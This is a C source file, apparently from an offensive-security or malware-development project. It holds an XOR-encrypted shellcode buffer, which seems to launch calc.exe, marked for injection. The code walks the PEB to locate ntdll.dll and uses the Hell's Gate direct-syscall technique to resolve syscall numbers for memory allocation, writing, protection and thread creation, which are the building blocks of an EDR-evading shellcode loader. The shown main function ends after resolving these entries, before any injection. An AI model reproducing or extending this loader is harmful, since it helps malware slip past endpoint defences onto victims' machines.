//includes
#include "encryption.h"
#include "utils.h"
#include "types.h"

//shellcode to inject encrypted with XOR, key "A"
BYTE buf[] =
	"\xbd\x09\xc2\xa5\xb1\xa9\x81\x41\x41\x41\x00\x10\x00\x11"
	"\x13\x10\x17\x09\x70\x93\x24\x09\xca\x13\x21\x09\xca\x13"
	"\x59\x09\xca\x13\x61\x09\xca\x33\x11\x09\x4e\xf6\x0b\x0b"
	"\x0c\x70\x88\x09\x70\x81\xed\x7d\x20\x3d\x43\x6d\x61\x00"
	"\x80\x88\x4c\x00\x40\x80\xa3\xac\x13\x00\x10\x09\xca\x13"
	"\x61\xca\x03\x7d\x09\x40\x91\xca\xc1\xc9\x41\x41\x41\x09"
	"\xc4\x81\x35\x26\x09\x40\x91\x11\xca\x09\x59\x05\xca\x01"
	"\x61\x08\x40\x91\xa2\x17\x09\xbe\x88\x00\xca\x75\xc9\x09"
	"\x40\x97\x0c\x70\x88\x09\x70\x81\xed\x00\x80\x88\x4c\x00"
	"\x40\x80\x79\xa1\x34\xb0\x0d\x42\x0d\x65\x49\x04\x78\x90"
	"\x34\x99\x19\x05\xca\x01\x65\x08\x40\x91\x27\x00\xca\x4d"
	"\x09\x05\xca\x01\x5d\x08\x40\x91\x00\xca\x45\xc9\x09\x40"
	"\x91\x00\x19\x00\x19\x1f\x18\x1b\x00\x19\x00\x18\x00\x1b"
	"\x09\xc2\xad\x61\x00\x13\xbe\xa1\x19\x00\x18\x1b\x09\xca"
	"\x53\xa8\x16\xbe\xbe\xbe\x1c\x09\xfb\x40\x41\x41\x41\x41"
	"\x41\x41\x41\x09\xcc\xcc\x40\x40\x41\x41\x00\xfb\x70\xca"
	"\x2e\xc6\xbe\x94\xfa\xb1\xf4\xe3\x17\x00\xfb\xe7\xd4\xfc"
	"\xdc\xbe\x94\x09\xc2\x85\x69\x7d\x47\x3d\x4b\xc1\xba\xa1"
	"\x34\x44\xfa\x06\x52\x33\x2e\x2b\x41\x18\x00\xc8\x9b\xbe"
	"\x94\x22\x20\x2d\x22\x6f\x24\x39\x24\x41";

//Exported assembly functions
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

//main function
int main(int argc, char* argv[])
{
	//module we want to find in memory C:\Windows\SYSTEM32\ntdll.dll
	const PWSTR TargetDLL = L"C:\\Windows\\SYSTEM32\\ntdll.dll";

	//perform PEB walking
	PPEB pPeb = GetPEBAddress();
	PPEB_LDR_DATA pLdr = GetLdrAddress(pPeb);
	PLIST_ENTRY pHeadNode = GetModuleList(pLdr);
	DWORD_PTR pModuleAddr = GetModuleBaseAddr(TargetDLL, pHeadNode);
	PBYTE pBase = (PBYTE)pModuleAddr;

	//make sure base address is not NULL
	if (pBase == 0 || pBase == NULL)
	{
		fprintf(stderr, "[!] Error finding %ls in memory\n", TargetDLL);
		exit(-1);
	}

	//output
	printf("[+] Found PEB at %p\n", pPeb);
	printf("[+] Found PEB_LDR_DATA struct at %p\n", pLdr);
	printf("[+] Found head of InMemoryOrderModuleList at %p\n", pHeadNode);
	printf("[+] Found %ls at %x\n", TargetDLL, pModuleAddr);

	//find address of functions we need to detect if hooks are present
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pModuleAddr;

	//error handling
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		fprintf(stderr, "[!] Error with casting to IMAGE_DOS_HEADER\n");
		exit(-1);
	}

	PIMAGE_NT_HEADERS pNtHeader = GetNTHeader(pBase, pDosHeader);
	if (pNtHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		fprintf(stderr, "[!] Error with getting NT HEADER struct\n");
		exit(-1);
	}

	PIMAGE_EXPORT_DIRECTORY pImgExportDir = GetImgExportDir(pBase, pNtHeader);

	//output
	printf("[+] Successfully parsed DOS header at address %p\n", pDosHeader);
	printf("[+] Successfully parsed NT header at address %p\n", pNtHeader);
	printf("[+] Successfully parsed the export directory at address %p\n", pImgExportDir);
	printf("[+] Successfully retrieved function names, addresses and ordinals\n");

	//populate VX_TABLE
	//initialize the hashes we need to check for, if found we save the SSN
	printf("[+] Initializing VX_TABLE values\n");
	VX_TABLE Table = { 0 };
	Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
	Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
	Table.NtWriteVirtualMemory.dwHash = 0x68a3c2ba486f0741;
	Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
	Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtAllocateVirtualMemory))
	{
		fprintf(stderr, "[!] Error with GetVxTableEntry for NtAllocateVirtualMemory...\n");
		exit(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtCreateThreadEx))
	{
		fprintf(stderr, "[!] Error with GetVxTableEntry for NtCreateThreadEx...\n");
		exit(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtWriteVirtualMemory))
	{
		fprintf(stderr, "[!] Error with GetVxTableEntry for NtWriteVirtualMemory...\n");
		exit(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtProtectVirtualMemory))
	{
		fprintf(stderr, "[!] Error with GetVxTableEntry for NtProtectVirtualMemory...\n");
		exit(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtWaitForSingleObject))
	{
		fprintf(stderr, "[!] Error with GetVxTableEntry for NtWaitForSingleObject...\n");
		exit(-1);
	}

	//for attaching a debugger
	getchar();

	return 0;
}